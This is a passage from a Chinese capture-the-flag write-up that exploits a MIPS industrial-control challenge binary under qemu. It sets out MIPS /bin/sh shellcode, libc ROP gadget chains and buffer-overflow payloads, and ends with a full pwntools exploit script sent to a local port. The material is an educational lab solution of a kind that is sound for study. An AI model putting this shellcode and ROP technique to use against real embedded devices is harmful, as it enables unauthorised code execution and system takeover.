    libc_base -= 0xDDEA4
    print 'libc_base: '+hex(libc_base)
###  shellcode准备
mips下的shellcode，拿一个准备好的shellcode，验证可以自行调用。
        "\xff\xff\x06\x28"  // slti $a2, $zero, -1
        "\x62\x69\x0f\x3c"  // lui $t7, 0x6962         ib
        "\x2f\x2f\xef\x35"  // ori $t7, $t7, 0x2f2f    ib//
        "\xf4\xff\xaf\xaf"  // sw $t7, -0xc($sp)      
        "\x73\x68\x0e\x3c"  // lui $t6, 0x6873         hs
        "\x6e\x2f\xce\x35"  // ori $t6, $t6, 0x2f6e    hs/n
        "\xf8\xff\xae\xaf"  // sw $t6, -8($sp)
        "\xfc\xff\xa0\xaf"  // sw $zero, -4($sp)
        "\xf4\xff\xa4\x27"  // addiu $a0, $sp, -0xc   //bin/sh
        "\xff\xff\x05\x28"  // slti $a1, $zero, -1
        "\xab\x0f\x02\x24"  // addiu $v0, $zero, 0xfab
        "\x0c\x01\x01\x01"  // syscall 0x40404
###  ROP寻找
寻找的目标就是首先找到一个能控制s1-sn并且有`jr $ra`的rop链，用mips-rop插件在libc中寻找合适的rop链：  
`mipsrop.find('jr $ra')`;  
发现以下rop，可以修改s0-s3寄存器：
    .text:000A0C7C loc_A0C7C:                               # CODE XREF: sub_A0B40+218↓j
    .text:000A0C7C                 lw      $ra, 0x2C+var_s10($sp)
    .text:000A0C80                 lw      $s3, 0x2C+var_sC($sp)
    .text:000A0C84                 lw      $s2, 0x2C+var_s8($sp)
    .text:000A0C88                 lw      $s1, 0x2C+var_s4($sp)
    .text:000A0C8C                 lw      $s0, 0x2C+var_s0($sp)
    .text:000A0C90                 jr      $ra
    .text:000A0C94                 addiu   $sp, 0x40
其实libc里面还有很多这样的gadgets，可以自行取用。此时我们可以控制ra返回地址和s寄存器。这里我们利用s3，在给s3赋值另一段gadget使其跳转到shellcode，我们再接着找能够跳转到s3寄存器且最好能将栈上的shellcode指针赋值给寄存器的gadget。  
`mipsrop.find("move $t9, $s3")`  
找到以下gadget：
    .text:000F60D4                 addiu   $a1, $sp, 0xB8+var_A0  # 控制shellcode给a1寄存器
    .text:000F60D8                 move    $t9, $s3 #跳向s3，s3可以指向a1，从而跳转到shellcode
    .text:000F60DC                 jalr    $t9
所以接下来的任务是要找能够跳转到a1的gadget。
    |  Address     |  Action                                              |  Control Jump                          |
    ----------------------------------------------------------------------------------------------------------------    |  0x0011C68C  |  move $t9,$a1                                        |  jalr  $a1                             |
    ----------------------------------------------------------------------------------------------------------------    
很幸运只有这一个：
    .text:0011C68C                 move    $t9, $a1
    .text:0011C690                 move    $a1, $a0
    .text:0011C694                 jalr    $t9
此时，可以跳向a1，而a1已经指向了shellcode，这个调用链完成了。可以得到以下rop链完成覆盖返回地址跳到shellcode。
    set_s3_addr = 0x0A0C7C
    # .text:000A0C7C                 lw      $ra, 0x2C+var_s10($sp)
    # .text:000A0C80                 lw      $s3, 0x2C+var_sC($sp)
    # .text:000A0C84                 lw      $s2, 0x2C+var_s8($sp)
    # .text:000A0C88                 lw      $s1, 0x2C+var_s4($sp)
    # .text:000A0C8C                 lw      $s0, 0x2C+var_s0($sp)
    # .text:000A0C90                 jr      $ra
    # .text:000A0C94                 addiu   $sp, 0x40
    addiu_a1_sp = 0xF60D4
    # .text:000F60D4                 addiu   $a1, $sp, 24
    # .text:000F60D8                 move    $t9, $s3
    # .text:000F60DC                 jalr    $t9
    jr_a1 = 0x11C68C
    # .text:0011C68C                 move    $t9, $a1
    # .text:0011C690                 move    $a1, $a0
    # .text:0011C694                 jalr    $t9
    payload =  ''
    payload += 'a'*508
    payload += p32(set_s3_addr+libc_base)           
    payload += 'b'*44
    payload += '0000'                        #s0
    payload += '1111'                        #s1
    payload += '2222'                        #s2
    payload += p32(jr_a1+libc_base)            #s3
    payload += p32(addiu_a1_sp+libc_base)    #ra    
    payload += 'd'*24
    payload += shellcode
还有一个点就是这个题部署的时候是用户模式部署的，qemu的用户模式解释汇编指令的时候，qemu翻译的特点导致指令流水有时候表现不出来，所以这里并没有调用函数去将数据区刷新到指令区域也是可以拿到shell的；但是如果题目使用system模式部署，添加调用函数刷新数据区域再跳转到shellcode就很必要了，这里再找两个gadget实现调用函数后再跳转到a1处的shellcode。这里挑选sleep函数比较方便。  
首先设置sleep参数1，跳转到s1  
`mipsrop.find("li $a0, 1")`
    .text:00124474                 move    $t9, $s1
    .text:00124478                 jalr    $t9 ; close
    .text:0012447C                 li      $a0, 1
在s1处放置下一段gadget，调用sleep函数，这里寻找能实现跳转到s2最好还能控制ra和其他s寄存器以使得能继续进行上述第一个跳转到shellcode的gadget。这里找到以下  
`mipsrop.find("move $t9, $s2")`
    .text:0008F3A4                 move    $t9, $s2
    .text:0008F3A8                 jalr    $t9 ; uselocale
    .text:0008F3AC                 move    $s0, $v0
    .text:0008F3B0                 lw      $ra, 0x24+var_s10($sp)
    .text:0008F3B4                 move    $v0, $s0
    .text:0008F3B8                 lw      $s3, 0x24+var_sC($sp)
    .text:0008F3BC                 lw      $s2, 0x24+var_s8($sp)
    .text:0008F3C0                 lw      $s1, 0x24+var_s4($sp)
    .text:0008F3C4                 lw      $s0, 0x24+var_s0($sp)
    .text:0008F3C8                 jr      $ra
    .text:0008F3CC                 addiu   $sp, 0x38
因此就可以找到以下调用链可是实现溢出后先调用sleep函数刷新数据区到当前指令区，然后再跳转到shellcode。
    payload =  ''
    payload += 'a'*508
    payload += p32(set_s3_addr+libc_base)          # overflow return address1
    payload += 'b'*44
    payload += '0000'                        #s0
    payload += p32(jr_t9_jr_ra+libc_base)    #s1    # goto sleep
    payload += p32(usleep+libc_base)        #s2    # sleep addr
    payload += '3333'                        #s3
    payload += p32(set_a0_addr+libc_base)    #ra    # overflow return address2
    payload += 'c'*48
    payload += p32(jr_a1+libc_base)            #s3    # goto a1(shellcode)
    payload += p32(addiu_a1_sp+libc_base)    #ra    # overflow return address3,modify a1 to sp+24(shellcode),goto s3
    payload += 'd'*24
    payload += shellcode
## exp
以下exp包含上述两个payload的实现：
    from pwn import *
    context.log_level = 'debug'
    libc_base = 0x7f62f000
    set_a0_addr = 0x124474
    # .text:00124474                 move    $t9, $s1
    # .text:00124478                 jalr    $t9 ; close
    # .text:0012447C                 li      $a0, 1
    set_s3_addr = 0x0A0C7C
    # .text:000A0C7C                 lw      $ra, 0x2C+var_s10($sp)
    # .text:000A0C80                 lw      $s3, 0x2C+var_sC($sp)
    # .text:000A0C84                 lw      $s2, 0x2C+var_s8($sp)
    # .text:000A0C88                 lw      $s1, 0x2C+var_s4($sp)
    # .text:000A0C8C                 lw      $s0, 0x2C+var_s0($sp)
    # .text:000A0C90                 jr      $ra
    # .text:000A0C94                 addiu   $sp, 0x40
    jr_t9_jr_ra = 0x8F3A4
    # .text:0008F3A4                 move    $t9, $s2
    # .text:0008F3A8                 jalr    $t9 ; uselocale
    # .text:0008F3AC                 move    $s0, $v0
    # .text:0008F3B0                 lw      $ra, 52($sp)
    # .text:0008F3B4                 move    $v0, $s0
    # .text:0008F3B8                 lw      $s3, 48($sp)
    # .text:0008F3BC                 lw      $s2, 44($sp)
    # .text:0008F3C0                 lw      $s1, 40($sp)
    # .text:0008F3C4                 lw      $s0, 36($sp)
    # .text:0008F3C8                 jr      $ra
    # .text:0008F3CC                 addiu   $sp, 0x38
    addiu_a1_sp = 0xF60D4
    # .text:000F60D4                 addiu   $a1, $sp, 24
    # .text:000F60D8                 move    $t9, $s3
    # .text:000F60DC                 jalr    $t9
    jr_a1 = 0x11C68C
    # .text:0011C68C                 move    $t9, $a1
    # .text:0011C690                 move    $a1, $a0
    # .text:0011C694                 jalr    $t9
    usleep = 0xEA810
    # sleep = 0xB2600
    shellcode  = b""
    shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
    shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962         ib
    shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f    ib//
    shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)      
    shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873         hs
    shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e    hs/n
    shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
    shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
    shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc   //bin/sh
    shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
    shellcode += b"\xab\x0f\x02\x24"  # addiu $v0, $zero, 0xfab
    shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404
    payload =  ''
    payload += 'a'*508
    payload += p32(set_s3_addr+libc_base)           # overflow return address1
    payload += 'b'*44
    payload += '0000'                        #s0
    payload += p32(jr_t9_jr_ra+libc_base)    #s1
    payload += p32(usleep+libc_base)        #s2
    payload += '3333'                        #s3
    payload += p32(set_a0_addr+libc_base)    #ra    # overflow return address2
    payload += 'c'*48
    payload += p32(jr_a1+libc_base)            #s3    # goto a1(shellcode)
    payload += p32(addiu_a1_sp+libc_base)    #ra    # overflow return address3,modify a1 to sp+24(shellcode),goto s3
    payload += 'd'*24
    payload += shellcode
    # payload =  ''
    # payload += 'a'*508
    # payload += p32(set_s3_addr+libc_base)           
    # payload += 'b'*44
    # payload += '0000'                        #s0
    # payload += '1111'                        #s1
    # payload += '2222'                        #s2
    # payload += p32(jr_a1+libc_base)            #s3
    # payload += p32(addiu_a1_sp+libc_base)    #ra    
    # payload += 'd'*24
    # payload += shellcode
    # io = process(['qemu-mipsel', '-L', './', '-g', '12345','./eserver'])
    # io = process(['qemu-mipsel', '-L', './', './eserver'])
    io = remote('127.0.0.1', 49154)
    io.sendlineafter('Input package: ', payload)
    io.sendlineafter('Input package: ', 'EXIT')
    io.interactive()
## 总结
这个题目让我了解了mips架构下rop的利用方式以及流水指令特点对shellcode执行的影响，熟悉了该架构下的调试方法和技巧，整体上是中规中矩的一道工控方向的题目，但是对mips架构rop能力还是有一定要求的，总之学到很多，各位加油！！
## 注
  1. system模式lib依赖 system 模式替换lib 会出现各种问题 用user模式调
  2. mipsel流水指令特点，user模式模拟 qemu翻译的特点导致指令流水有时候表现不出来